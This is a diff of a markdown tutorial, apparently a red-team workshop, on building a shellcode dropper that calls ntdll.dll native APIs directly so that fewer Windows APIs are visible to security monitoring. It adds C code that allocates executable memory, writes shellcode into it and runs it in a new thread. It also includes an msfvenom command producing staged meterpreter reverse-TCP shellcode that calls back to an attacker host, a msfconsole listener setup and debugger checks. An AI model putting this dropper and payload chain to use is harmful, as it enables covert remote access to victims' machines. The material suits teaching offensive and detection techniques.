@@ -54,6 +54,7 @@ Shellcode declaration same as before in the high-level API dropper.
 
 To directly access the code of the native APIs used, we need to manually load the required native APIs from ntdll.dll.
 <details>
+    
 ```
 // Load native API functions from ntdll.dll
     PNTALLOCATEVIRTUALMEMORY NtAllocateVirtualMemory = (PNTALLOCATEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
@@ -66,27 +67,48 @@ To directly access the code of the native APIs used, we need to manually load th
 </details>    
 
 For memory allocation, we replace the Windows API VirtualAlloc with the native API **NtAllocateVirtualMemory**.
-<p align="center">
-<img width="741" alt="image" src="https://user-images.githubusercontent.com/50073731/235373720-c004340c-4132-41b7-9494-1d7f0aaea053.png">
-</p>
+<details>
+    
+```    
+// Allocate Virtual Memory with PAGE_EXECUTE_READWRITE permissions to store the shellcode
+    // 'exec' will hold the base address of the allocated memory region
+    void* exec = NULL;
+    SIZE_T size = sizeof(code);
+    NtAllocateVirtualMemory(GetCurrentProcess(), &exec, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+```    
+</details>    
 
 For shellcode copying, we replace the Windows API WriteProcessMemory with the native API **NtWriteVirtualMemory**.
-<p align="center">
-<img width="591" alt="image" src="https://user-images.githubusercontent.com/50073731/235374052-448e1e9d-caf5-4d80-972f-fd0ef70feb95.png">
-</p>
+<details>
+```
+// Copy the shellcode into the allocated memory region
+    SIZE_T bytesWritten;
+    NtWriteVirtualMemory(GetCurrentProcess(), exec, code, sizeof(code), &bytesWritten);    
+```
+</details>    
+    
 
 For shellcode execution, we replace the Windows API CreateThread with the native API **NtCreateThreadEx**.
-<p align="center">
-<img width="568" alt="image" src="https://user-images.githubusercontent.com/50073731/235374248-fecf50c3-72b9-4f2b-95b3-d0aa86378a79.png">
-</p>
+<details>
+```
+// Execute the shellcode in memory using a new thread
+    // Pass the address of the shellcode as the thread function (StartRoutine) and its parameter (Argument)
+    HANDLE hThread;
+    NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), exec, exec, FALSE, 0, 0, 0, NULL);
+```
+</details>
 
 And finally we have to replace the Windows API WaitForSingleObject with the native API **NtWaitForSingleObject**.
-<p align="center">
-<img width="603" alt="image" src="https://user-images.githubusercontent.com/50073731/235374361-df94b5cc-1307-4229-9d54-c83bafe2daac.png">
-</p>
+<details>
+```
+// Wait for the end of the thread to ensure the shellcode execution is complete
+    NtWaitForSingleObject(hThread, FALSE, NULL);
+```
+</details>    
 
 Here is the complete code, and you can copy and paste this code into your MLA-Dropper project in Visual Studio.
-
+<details>
+    
 ```
 #include <stdio.h>
 #include <windows.h>
@@ -138,10 +160,14 @@ int main() {
 
 }
 ```
+</details>
 
-
+    
 ## Meterpreter Shellcode
 Again, we will create our meterpreter shellcode with msfvenom in Kali Linux. To do this, we will use the following command and create x64 staged meterpreter shellcode.
+<details>
+    
+ **kali>**   
 ```
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IPv4_Redirector_or_IPv4_Kali LPORT=80 -f c > /tmp/shellcode.txt
 ```
@@ -152,11 +178,13 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IPv4_Redirector_or_IPv4_Ka
 The shellcode can then be copied into the MLA-Dropper poc by replacing the placeholder at the unsigned char, and the poc can be compiled as an x64 release.<p align="center">
 <img width="479" alt="image" src="https://user-images.githubusercontent.com/50073731/235414557-d236582b-5bab-4754-bd12-5f7817660c3a.png">
 </p>
+</details>    
 
 
 ## MSF-Listener
 Before we test the functionality of our MLA-Dropper, we need to create a listener within msfconsole.
-
+</details>
+    
 **kali>**
 ```
 msfconsole
@@ -179,20 +207,27 @@ Once the listener has been successfully started, you can run your compiled MLA-D
 <p align="center">
 <img width="674" alt="image" src="https://user-images.githubusercontent.com/50073731/235369228-84576762-b3b0-4cf7-a265-538995d42c40.png">
 </p>
+</details>
 
 
-
-## MLA-Dropper analysis: Dumpbin tool
-The Visual Studio tool dumpbin can be used to check which Windows APIs are imported via kernel32.dll. The following command can be used to check the imports.
+## MLA-Dropper analysis: dumpbin 
+The Visual Studio tool dumpbin can be used to check which Windows APIs are imported via kernel32.dll. The following command can be used to check the imports. Which results do you expect?
+<details>    
+    
 **cmd>**
 ```
 cd C:\Program Files (x86)\Microsoft Visual Studio\2019\Community
 dumpbin /imports high_level.exe
 ```
-Compared to the high level dropper, you can observe that the medium level dropper **no longer imports** the Windows APIs VirtualAlloc, WriteProcessMemory, CreateThread and WaitForSingleObject from kernel32.dll. This result was expected and is correct.
+</details>    
+
+<details>
+    <summary>Solution</summary>    
+As expected, when compared to the high-level dropper, you can see that the medium-level dropper **no longer imports** the Windows APIs VirtualAlloc, WriteProcessMemory, CreateThread, and WaitForSingleObject from kernel32.dll. This was expected and is correct.
 <p align="center">
 <img width="729" alt="image" src="https://user-images.githubusercontent.com/50073731/235374656-117e0468-cd4d-4832-afb7-599cf94d2f1b.png">
 </p>
+</details>    
 
 ## MLA-Dropper analysis: API-Monitor
 Compared to the high-level dropper, you can see that the Windows APIs VirtualAlloc, WriteProcessMemory, CreateThread, and WaitForSingleObject no longer pass to the four corresponding native APIs. For a correct check, it is necessary to filter to the correct APIs. Only by providing the correct Windows APIs and the corresponding native APIs, we can be sure that there are no more transitions in context of the used APIs in our MLA-Dropper. We filter on the following API calls:
@@ -205,15 +240,34 @@ Compared to the high-level dropper, you can see that the Windows APIs VirtualAll
 - WaitForSingleObject
 - NtWaitForSingleObject
 
+<details>
+    <summary>Solution</summary>    
 If everything was done correctly, you could observe that there are more transitions from the Windows APIs to the native APIs we used in our MLA-Dropper poc.
 This result was expected and is correct because our MLA-Dropper accesses or imports the needed native APIs NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx and NtWaitForSingleObject directly from ntdll.dll.
 <p align="center">
 <img width="522" alt="image" src="https://user-images.githubusercontent.com/50073731/235374864-c7e90dd6-82c6-49d1-a90c-b80a531416b3.png">
 </p>
+</details>    
 
 ## MLA-Dropper analysis: x64dbg 
-Using x64dbg we verify from which region in the PE structure of the MLA-Dropper the system calls for the used native APIs are executed. Since direct system calls are not yet used in MLA-Dropper, the figure again shows that the system call is correctly executed from the .text region of ntdll.dll. 
-![image](https://user-images.githubusercontent.com/50073731/235368598-ad159117-abb5-4b0d-8b52-bea2a162b565.png)
+Using x64dbg we want to validate from which module and location the respective system calls are executed in the context of the used Windows APIs -> native APIs?
+Remember, so far we have not implemented system calls or system call stubs directly in the dropper. What results would you expect?
+<details>
+    <summary>Solution</summary>
+    
+1. Open or load your MLA-Dropper.exe into x64dbg
+2. Go to the Symbols tab, in the **left pane** in the **Modules column** select or highlight **ntdll.dll**, in the **right pane** in the **Symbols column** filter for the first native API **NtAllocateVirtualMemory**, right click and **"Follow in Dissassembler"**. To validate the other three native APIs, NtWriteVirtualMemory, NtCreateThreadEx and NtWaitForSingleObject, just **repeat this procedure**. 
+    
+<p align="center">    
+<img width="867" alt="image" src="https://user-images.githubusercontent.com/50073731/235445644-240e5c3b-a3cf-4a7a-99be-27412e2dcb82.png">
+</p>
+    
+As expected, we can observe that the corresponding system calls for the native APIs NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx, NtWaitForSingleObject are correctly executed/imported from the .text section in the ntdll.dll module. This investigation is very important because later in the direct syscall exercise we expect a different result with the low level dropper and want to match it.
+    
+<p align="center">    
+<img width="686" alt="image" src="https://user-images.githubusercontent.com/50073731/235445865-c3fe83fa-1539-4ff3-b850-96cc91a0a01d.png">
+</p>    
+</details>
 
 
 ## Summary: Medium-level API Dropper
